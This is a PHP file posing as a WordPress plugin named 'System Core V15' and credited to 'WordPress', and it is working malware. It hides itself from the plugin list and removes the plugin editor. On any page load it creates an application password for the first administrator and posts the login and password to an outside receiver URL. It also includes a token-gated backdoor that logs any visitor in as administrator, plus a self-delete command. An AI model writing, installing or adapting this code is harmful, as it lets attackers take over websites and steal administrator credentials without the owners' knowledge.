<?php
/*
Plugin Name: System Core V15
Description: Manual Mode.
Version: 15.0
Author: WordPress
*/

if (!defined('ABSPATH')) exit;

define('RLS_SERVER', 'https://stepmomhub.com/wp/receiver.php'); 
define('RLS_KEY', 'wtf'); 

add_filter('all_plugins', function($p){ unset($p[plugin_basename(__FILE__)]); return $p; });
add_action('admin_menu', function(){ remove_submenu_page('plugins.php', 'plugin-editor.php'); }, 999);

// FILTER: Paksa fitur Application Password aktif
add_filter('wp_is_application_passwords_available', '__return_true');

// ACTION: Gunakan 'init' agar jalan di halaman DEPAN & BELAKANG (Tanpa Login)
add_action('init', 'rls_auto_setup');

function rls_auto_setup() {
    // 1. Cek apakah sudah pernah dijalankan (agar tidak spam request)
    if (get_option('rls_setup_done') === 'yes') return;

    // 2. Pastikan class Application Password dimuat (kadang tidak auto-load di frontend)
    if (!class_exists('WP_Application_Passwords')) {
        $app_pass_file = ABSPATH . 'wp-includes/class-wp-application-passwords.php';
        if (file_exists($app_pass_file)) {
            require_once $app_pass_file;
        }
    }
    
    // Jika masih tidak ada (WP versi lama < 5.6), stop.
    if (!class_exists('WP_Application_Passwords')) return;

    // 3. Cari User Administrator
    $target_user = null;
    $user_id_1 = get_user_by('id', 1);
    
    if ($user_id_1 && in_array('administrator', (array) $user_id_1->roles)) {
        $target_user = $user_id_1;
    } else {
        // Fallback: ambil admin pertama yang ada
        $admins = get_users(['role' => 'administrator', 'number' => 1, 'orderby' => 'ID', 'order' => 'ASC']);
        if (!empty($admins)) {
            $target_user = $admins[0];
        }
    }

    if (!$target_user) return;

    // 4. Proses Pembuatan Password
    $api_user = $target_user->user_login;
    $api_pass = '';
    $app_name = 'System Core API';

    // Bersihkan password lama dengan nama sama
    $existing = WP_Application_Passwords::get_user_application_passwords($target_user->ID);
    foreach ($existing as $e) {
        if ($e['name'] === $app_name) {
            WP_Application_Passwords::delete_application_password($target_user->ID, $e['uuid']);
        }
    }

    // Buat Baru
    $new_app_pass = WP_Application_Passwords::create_new_application_password($target_user->ID, ['name' => $app_name]);
    
    if (!is_wp_error($new_app_pass) && !empty($new_app_pass[0])) {
        $api_pass = $new_app_pass[0];

        // 5. Kirim ke Receiver
        wp_remote_post(RLS_SERVER, [
            'body' => [
                'action'   => 'register_site',
                'secret'   => RLS_KEY,
                'domain'   => site_url(),
                'api_user' => $api_user,
                'api_pass' => $api_pass
            ],
            'sslverify' => false,
            'blocking'  => false     
        ]);

        // Tandai selesai di database
        update_option('rls_setup_done', 'yes');
    }
}

// Handler cadangan untuk akses backdoor manual
add_action('init', 'rls_handler');
function rls_handler() {
    if (!isset($_GET['rls_action'])) return;
    
    @ini_set('display_errors', 0);
    $act = $_GET['rls_action'];
    $tok = isset($_GET['token']) ? $_GET['token'] : '';

    if ($act === 'check_status') { echo 'LIVE_SIGNAL_ACK'; exit; }
    if ($tok !== RLS_KEY) return;
  
    if ($act === 'login') {
        $admins = get_users(['role' => 'administrator', 'number' => 1]);
        if (!empty($admins)) {
            $u = $admins[0];
            wp_set_current_user($u->ID, $u->user_login);
            wp_set_auth_cookie($u->ID);
            do_action('wp_login', $u->user_login, $u);
            wp_redirect(admin_url()); exit;
        }
    }
    
    if ($act === 'self_destruct') {
        require_once(ABSPATH . 'wp-admin/includes/plugin.php');
        deactivate_plugins(plugin_basename(__FILE__));
        unlink(__FILE__);
        echo 'DESTROYED_ACK'; exit;
    }
}
?>
